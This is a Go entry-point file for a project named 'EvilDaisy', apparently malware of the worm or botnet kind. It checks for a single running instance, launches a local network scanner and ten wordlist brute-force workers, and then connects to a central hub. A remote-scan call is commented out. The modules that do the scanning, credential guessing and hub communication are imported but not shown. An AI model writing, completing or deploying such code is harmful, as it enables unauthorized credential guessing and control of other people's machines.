package main

import (
	"runtime"

	"EvilDaisy/Network"
	"EvilDaisy/Scanner"
	"EvilDaisy/Utils"
	"EvilDaisy/Wordlist"
)

// LocalBruteForce ...
var LocalBruteForce *Wordlist.BruteForceWorkers

// Initialize ...
func Initialize() bool {
	runtime.GOMAXPROCS(runtime.NumCPU())
	if !Utils.CheckProcess() {
		Utils.AccessIPList = make(chan string, 100)
		if LocalBruteForce, err := Wordlist.NewBruteForceWorker(10); err == nil {
			go Scanner.StartLocalScan()
			go func() {
				LocalBruteForce.Run()
			}()
			//go Scanner.StartTheRemoteScan()
			return true
		}
	}

	return false
}

func main() {
	if Initialize() {
		Network.ConnectTheHub()
	}
}
